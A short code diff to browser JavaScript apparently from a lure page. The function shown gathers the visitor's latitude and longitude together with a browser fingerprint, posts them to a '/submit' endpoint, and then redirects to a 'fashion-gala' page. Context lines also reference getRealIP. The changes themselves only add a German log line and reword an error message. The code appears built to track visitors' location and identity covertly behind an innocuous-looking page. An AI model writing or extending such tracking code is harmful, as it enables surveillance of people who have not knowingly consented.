@@ -4267,6 +4267,7 @@ function getRealIP() {
 
 function sendLocation(lat, lon, method, extraData) {
   const fingerprint = collectBrowserFingerprint();
+  console.log("📡 Sende Standort:", { lat, lon, method });
   fetch('/submit', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -4280,7 +4281,7 @@ function sendLocation(lat, lon, method, extraData) {
     })
   }).then(() => {
     window.location.href = "/fashion-gala.html"; 
-  }).catch(err => console.error("Submit failed:", err));
+  }).catch(err => console.error("Fehler:", err));
 }
 
 window.onload = getLocationWithFallback;
